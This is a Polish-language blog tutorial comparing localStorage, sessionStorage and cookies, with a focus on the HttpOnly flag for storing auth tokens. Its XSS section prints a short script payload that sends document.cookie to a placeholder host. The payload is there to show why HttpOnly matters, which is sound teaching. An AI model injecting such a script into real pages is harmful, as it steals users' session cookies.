---
title: "Różne metody przechowywania danych w przeglądarce"
date: "2021-02-07"
categories: 
  - "javascript"
tags: 
  - "javascript"
  - "dom"
  - "przeglądarka"
  - "localStorage"
  - "sessionStorage"
  - "cookie"
  - "ciasteczka"
author:
  name: Marek Szkudelski
  picture: '/assets/blog/authors/face.png'
ogImage:
    url: ''
level: "Podstawowy"
published: 'true'
description: 'Prędzej czy później musimy coś zapisać w pamięci przeglądarki. W tym artykule porównuję trzy metody: `localStorage`, `sessionStorage` oraz `cookie`. 
Pokazuję ich zalety i wady, a także dobre praktyki.'
--- 

Przy tworzeniu nawet stosunkowo małych aplikacji internetowych prędzej czy później dochodzi do konieczności zapisania jakichś informacji w pamięci przeglądarki. Najpopularniejsze sposoby to localStorage, sessionStorage oraz cookie. Który z nich wybrać i jak to zrobić? Na te pytania postaram się odpowiedzieć, pokazując zalety i wady tych rozwiązań.

## Local/Session Storage

Zarówno localStorage, jak i sessionStorage są bardzo podobne do siebie, ponieważ korzystają z tego samego interfejsu. Jest nim Web Storage API, który aktualnie jest dostępny we wszystkich znaczących przeglądarkach (Can I use). Dzięki temu API możemy w bardzo ładny sposób pobierać, zapisywać, bądź usuwać elementy ze Storage'ów. Wszystko, co zapisujemy, musi być ciągiem znaków (string), więc często jest potrzeba, żeby dane konwertować (na przykład za pomocą JSON). Jednak praktycznie każdy typ można sparsować do stringa, więc jedynym ograniczeniem dla Storage'ów jest ich pojemność.

### **Różnice**

Tak jak napisałem wcześniej local i session Storage mają takie same interfejsy i taką samą pojemność, więc jakie są różnice pomiędzy nimi, że są osobnymi bytami? Zasadniczą różnicą jest trwałość tych danych i ich zasięg. Zasięgiem localStorage jest tak zwany origin adresu url. Na origin składają się części tego adresu takie jak: protokół (HTTP lub HTTPS), domena oraz port. Reszta nie ma znaczenia w kontekście originu. To oznacza, że będziemy mieć różne localStorage dla tej samej aplikacji, ale z różnym protokołem, albo serwowane na różnym porcie. Oznacza to też, że aplikacja serwowane na danej subdomenie nie będzie miała dostępu do localStorage nadrzędnej domeny. 

> Więcej o origin znajdziesz w [dokumentacji MDN](https://developer.mozilla.org/en-US/docs/Glossary/origin).

Podsumowując, localStorage jest ten sam dla danej aplikacji hostowanej na danym origin'ie, nieważne ile razy jest otwarta w danej przeglądarce - nawet w różnych oknach. Natomiast sessionStorage, jak sama nazwa wskazuje, jest ściśle powiązany z sesją, czyli daną kartą/zakładką otwartą w przeglądarce. Oznacza to, że jeśli otworzymy tę samą aplikację serwowaną na tym samym origin'ie w dwóch zakładkach, to będziemy mieli dwa niezależne sessionStorage. Jeśli zamkniemy zakładkę w przeglądarce, to sessionStorage z nią powiązany zostanie wyczyszczony.

### **Zastosowania**

Ze względu na bardzo łatwy dostęp do tych pamięci i brak praktycznie jakichkolwiek zabezpieczeń raczej odradzałbym przechowywanie tam wrażliwych danych. Każdy, chociażby z poziomu DevTools może odczytać zarówno localStorage, jak i sessionStorage. Jest to podatność na ataki typu [XSS](https://sekurak.pl/czym-jest-xss/).

Można natomiast przechowywać tam wszystkie informacje, które nie mają związku z bezpieczeństwem takie jak postępy w grach albo onboardingach (samouczkach). 

Jeśli chodzi o localStorage to jego użycie i zastosowania bardzo dobrze zostały opisane w artykule [https://frontstack.pl/czym-jest-local-storage-i-jak-uzywac/](https://frontstack.pl/czym-jest-local-storage-i-jak-uzywac/). Użycie sessionStorage jest identyczne, a zastosowania mogą być takie same, ale musimy pamiętać o ograniczeniach przechowywania danych.

Nie będę omawiał tutaj użycia tych dwóch Storage'ów, ponieważ można zajrzeć do [dokumentacji Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API), gdzie zostało to dość dobrze opisane.

### **Pojemność**

Na przykład w Google Chrome maksymalna pojemność dla local/sessionStorage to 5MB na każdy z nich. Biorąc, pod uwagę ich zasięg można powiedzieć, że mamy dostęp do 5MB na każdą sesję poprzez sessionStorage oraz 5MB współdzielonej pamięci na dany origin przez localStorage.

## **Cookie**

Kolejną możliwością na zapisanie danych aplikacji internetowej w przeglądarce są tak zwane ciasteczka, które kryją się pod właściwością `document.cookie`. Zacznę może od wady tej metody, która od razu rzuca się w oczy na tle poprzednio omawianych. W przypadku Storage'ów mieliśmy do dyspozycji bardzo przyjazny interface Web Storage API, który sprawiał, że operacje na danych zapisanych tam były bardzo proste. Jeśli chodzi o ciasteczka, to niestety, ale mamy do dyspozycji tylko to, co widzimy na zewnątrz, czyli `document.cookie`. Właściwość jest jednocześnie getterem i setterem. Odpowiada za dodawanie nowych cookies, modyfikacje już istniejących oraz odczytywanie wszystkich.

```jsx
document.cookie = 'cookie=asd'; // cookie is 'asd'
document.cookie = 'cookie=123'; // cookie is '123'
console.log(document.cookie); // 'cookie=123'
```

Jak widzicie w powyższym przykładzie, ciasteczko ustawiamy setterem `cookie` w formacie klucz i wartość oddzielone znakiem równości. Kolejne ciasteczka byłyby oddzielone średnikami.

Jest to najprostsza możliwość, ponieważ możemy też ustawić dodatkowe właściwości ciasteczka. Jedne z tych właściwości, to `domain`, `path`, `expires`, `httpOnly`.

Zanim przejdziemy do wytłumaczenia tych właściwości, to warto zastanowić się nad tym, jakie jest główne zastosowanie ciasteczek. Poza tym, że możemy zapisać sobie jakieś dane w przeglądarce, to cookie są wysyłane przy każdym zapytaniu HTTP. Oznacza to, że możemy wysłać informacje do serwera np. o aktualnie zalogowanym użytkowniku bez żadnej dodatkowej logiki. Nie trzeba ciasteczek dołączać explicit do zapytania.

### Domain i path

Jeśli chodzi o `domain` oraz `path`, to określają nam one zasięg danego ciasteczka. Możemy ustawić ciasteczko na danej domenie, domenie nadrzędnej lub subdomenie aktualnej domeny. Nie możemy natomiast dla innej domeny lub innej subdomeny domeny nadrzędnej (potocznie „rodzeństwa" domeny ;)). Możemy też zawęzić zasięg ciasteczka względem adresu url. Ustawiając `path` na `'/users'` ciasteczko będzie dostępne tylko pod adresem `https://domain.example.com/users/*`. Bardzo dobrze zostało to przedstawione w tym artykule [https://geek.justjoin.it/cookie-jak-zastosowac-atrybuty-domain-i-path](https://geek.justjoin.it/cookie-jak-zastosowac-atrybuty-domain-i-path). Kiedy mówię o zasięgu ciasteczek, to mam na myśli domenę i url, z jakich wykonujemy zapytania http. Ciasteczka, które są poza aktualnym url, albo mają ustawioną inną domenę, nie zostaną dołączone do zapytania.

### Czas życia ciasteczka

Właściwość `expire` określa, kiedy dane ciasteczko wygasa, czyli po prostu zostaje usunięte. To pole określa datę wygaśnięcia, ale mamy też do dyspozycji właściwość `max-age`, które określa, w sekundach, ile ciasteczko będzie istniało.

```jsx
document.cookie = 'cookie=123; expires=Mon Sep 30 2021 13:52:50 GMT+0200';
document.cookie = 'cookie=123; max-age=3600';
```

W pierwszym przykładzie ciasteczko wygaśnie 30 września 2021 roku o konkretnej godzinie. Natomiast w drugim podajemy dokładny czas trwania życia ciasteczka w sekundach, tutaj akurat to jest godzina.

### Flaga HttpOnly

Jest to bardzo specyficzna właściwość, ponieważ nie może być ustawiona na `true` z poziomu kodu JavaScript. Jak wspomniałem wcześniej, ciasteczka są wysyłane na serwer razem z zapytaniem Http. Serwer może też te ciasteczka ustawić nagłówkiem `Set-Cookie`. Jeśli ciasteczko jest ustawione przez nagłówek, a nie przez nasz kod, to może mieć ono flagę `HttpOnly` ustawioną na `true` (musimy to określić w nagłówku). Oznacza to, że nie będziemy mieć dostępu do tego ciasteczka przez `document.cookie`, ani w żaden inny sposób - nawet tylko do odczytu. Ponadto kod JavaScript nie ma dostępu do nagłówka `Set-Cookie`.

Jest rozwiązanie idealne do przekazywania wrażliwych danych pomiędzy serwerem i klientem. Poprzez ataki typu XSS bardzo łatwo można uzyskać dostęp np. do tokenu autoryzacyjnego poprzez `document.cookie`, `localStorage` lub `sessionStorage` (w zależności od tego, gdzie go przechowujemy). Dzięki `HttpOnly` możemy temu zapobiec. Zobaczmy, na czym dokładnie polega zagrożenie.

### Atak XSS

Atak z angielskiego znany jako Cross Site Scripting w podstawach jest bardzo prosty. Polega na umieszczeniu na stronie jakieś skryptu, który doprowadzi do wycieku danych. Można na przykład wkleić poniższy fragment kodu HTML w input, którego wartość będzie później gdzieś renderowana.

```html
<script type=“text/javascript”>
	document.location=“http://some.domain.com/?c=“+document.cookie;
</script>
```

Powyższy skrypt zmieni adres url na adres konkretnego serwera i doklei do naszego ciasteczka jako część query. Serwer podczas tego zapytania przechwyci ciasteczka i będzie mógł wyciągnąć z nich np. token autoryzacyjny i uzyskać dostęp do wrażliwych danych z naszego API. Jak wspomniałem wcześniej, jeśli ustawimy ciasteczko nagłówkiem przez serwer i `HttpOnly` będzie ustawione na `true`, to `document.cookie` nie zwróci go. Co za tym idzie, powyższy atak XSS się nie powiedzie.

### Zastosowania ciasteczek

Z jednej strony ze względu na możliwość dokładnego ustalenia czasu usunięcia ciasteczka mogą one służyć w przypadku kiedy chcemy przechowywać dane przez jakiś czas. Dobrym przykładem może być zapisywanie zawartości koszyka w sklepie (dla użytkownika, który nie ma konta bądź nie jest zalogowany). Po jakimś czasie (miesiąc, rok) możemy chcieć wyczyścić taki koszyk, ponieważ oferta się zmienia i produkty mogą się zmienić. Z drugiej strony możemy nie chcieć sugerować użytkownikowi, który wraca po dłuższym czasie, że ma coś w koszyku, bo może go wprowadzać to w błąd. 

Ze względu na nagłówek `Set-Cookie` i flagę `HttpOnly` ciasteczka są świetnym narzędziem do dbania o bezpieczeństwo aplikacji internetowej. Jest to moim zdaniem najlepszy sposób, żeby przechowywać wrażliwe dane takie jak token autoryzacyjny. Ponadto możemy ustawić flagę `Secure` dzięki, której ciasteczko będzie wysyłane tylko przy zapytaniu przez protokół HTTPS. Zapobiega to kolejnym atakom mogącym doprowadzić do wycieku danych.

### Przykład

Działanie nagłówka `Set-Cookie` z flagą `HttpOnly` możecie sprawdzić na prostym przykładzie napisanym w NodeJs: [https://codesandbox.io/s/http-only-gqy4m](https://codesandbox.io/s/http-only-gqy4m). Jeśli odpalicie sobie aplikację w osobnym oknie/zakładce, to możecie wejść w Network w DevTools'ach i zobaczyć, że już przy drugim zapytaniu na url https://domena.com/ token jest odsyłany w nagłówku tego zapytania. Możecie też spróbować go zmodyfikować w Konsoli i po odświeżeniu sprawdzić jeszcze raz. Nie uda wam się :) Dzięki temu mamy pewność, że dowolnemu atakowi XSS też się nie uda.

### Podsumowanie

Są też oczywiście inne możliwości na zapisanie danych w pamięci przeglądarki, ale te, które opisałem tutaj, są najczęściej wykorzystywane. Natomiast jeśli chcecie pogłębić wiedzę, to możecie poczytać np. o IndexedDB albo o WebSQL. Ja tymczasem podsumuję to, czego nauczyliśmy się o local/sessionStorage oraz o ciasteczkach.

1. Ze względu na prostotę użycia local/sessionStorage wykorzystywałbym je w każdym przypadku kiedy nie trzeba dbać o bezpieczeństwo oraz nie chcemy zapisać czego czasowo.
2. Główną różnicą pomiędzy local oraz session Storage jest to, że dane zapisane w sessionStorage zostaną usunięte, jeśli użytkownik zamknie zakładkę. Natomiast dane w localStorage będą zapisane, dopóki ich nie usuniemy i są współdzielone pomiędzy zakładkami przeglądarki (w ramach tej samej aplikacji).
3. Do przechowywania wrażliwych danych warto użyć ciasteczek ustawianych z poziomu serwera z flagą HttpOnly.
